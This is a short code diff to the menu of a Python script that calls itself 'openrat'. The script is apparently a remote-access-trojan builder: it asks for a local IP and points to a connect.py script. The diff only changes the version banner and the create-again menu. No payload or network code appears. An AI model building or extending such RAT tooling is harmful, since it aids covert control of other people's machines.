@@ -10,7 +10,7 @@ print "*| |__| | |_) |  __/ | | | | \ \ (_| | |_   *"
 print "* \____/| .__/ \___|_| |_|_|  \_\__,_|\__|  *"
 print "*       | |                                 *"
 print "*       |_|                                 *"
-print "*                                 v.1.0     *"
+print "*                                 v.1.1     *"
 print "*             Created by L0(KER#_#          *"
 print "*********************************************"
 print "Enter your local ip"
@@ -38,10 +38,10 @@ print ('Creation was successful')
 print ('For connect open script connect.py')
 print ('**********************************')
 print ('Create new?')
-print ('1) Yes')
-print ('2) No, exit')
+print ('1) No, exit')
+print ('2) Yes')
 a = int(input('openrat>'))
-if a < 2:
-    print('Please, restart the openrat!')
-elif a < 3:
+if a > 1:
+    print('Please, run the reload.py script!')
+elif a < 2:
     print('Bye!')
